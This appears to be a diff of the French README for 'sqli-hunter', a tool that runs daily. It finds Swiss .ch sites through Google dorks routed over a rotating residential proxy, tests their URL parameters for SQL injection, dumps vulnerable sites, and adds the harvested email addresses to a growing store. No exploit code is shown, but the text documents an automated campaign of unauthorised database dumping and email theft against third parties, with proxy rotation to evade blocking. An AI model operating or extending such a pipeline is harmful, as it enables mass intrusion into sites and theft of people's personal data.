@@ -88,7 +88,7 @@ Cron (tous les jours à 3h) :
 ```
 
 Ce que fait le mode daily :
-1. **Auto discover** — DuckDuckGo → Google (proxies) → Bing
+1. **Discover Google** — dorks `.ch` via proxy BP (`DISCOVER_PROXY`)
 2. **Curseur daily** — avance dans `results/discover_cursor.json`
 3. **Rotation dorks** — ordre des requêtes changé chaque jour
 4. Ignore domaines déjà dumpés + URLs déjà scannées
@@ -96,35 +96,34 @@ Ce que fait le mode daily :
 6. **Dédup** — n'ajoute que les emails pas encore dans `results/emails/`
 
 Fichiers d'état :
-- `results/discover_cursor.json` — position Bing pour le prochain daily
+- `results/discover_cursor.json` — position Google pour le prochain daily
 - `results/scanned_urls.txt` — URLs déjà testées
 - `results/dumped_domains.txt` — sites déjà dumpés
 - `results/emails/*.txt` — stock cumulé
 
 ## Découverte d'URLs (`discover`)
 
-Collecte via **auto** (DDG sans proxy, puis Google avec proxies rotatifs, puis Bing).
+Collecte via **Google** (proxy résidentiel BP — IP rotative côté fournisseur).
 
 ```bash
-# Proxies rotatifs pour Google (recommandé VPS)
-export DISCOVER_PROXIES="http://user:pass@host1:port,http://user:pass@host2:port"
+# Copier sqli-hunter.env.example → sqli-hunter.env
+# DISCOVER_PROXY=http://user:pass:residential.bpproxy.at:1000
 ./sqli-hunter daily
 
-# Forcer Google uniquement
-./sqli-hunter ch --source google --discover-limit 500
+./sqli-hunter ch --discover-limit 500
 ```
 
 | `--source` | Moteur |
 |------------|--------|
-| `auto` | DDG → Google (si proxies) → Bing [défaut daily] |
-| `google` | Google + `DISCOVER_PROXIES` obligatoire |
-| `duckduckgo` | DuckDuckGo HTML |
-| `bing` | Bing direct |
+| `google` | Google + `DISCOVER_PROXY` [défaut] |
 | `wayback` | Archive (1 domaine) |
 
-Variables :
-- `DISCOVER_PROXIES` — liste proxy rotatif (virgule / ligne)
-- `DISCOVER_PROXY` — un seul proxy
+Variables (`sqli-hunter.env` ou env) :
+- `DISCOVER_PROXY` — proxy BP (`http://user:pass:host:port`)
+- `DISCOVER_PROXIES` — liste optionnelle (virgule / ligne)
+
+| Option | Description |
+|--------|-------------|
 | `--paths` | Filtre manuel path (optionnel) |
 | `--params` | Filtre manuel paramètres (optionnel) |
 | `--no-filter` | Toutes URLs .ch avec `?param=` |
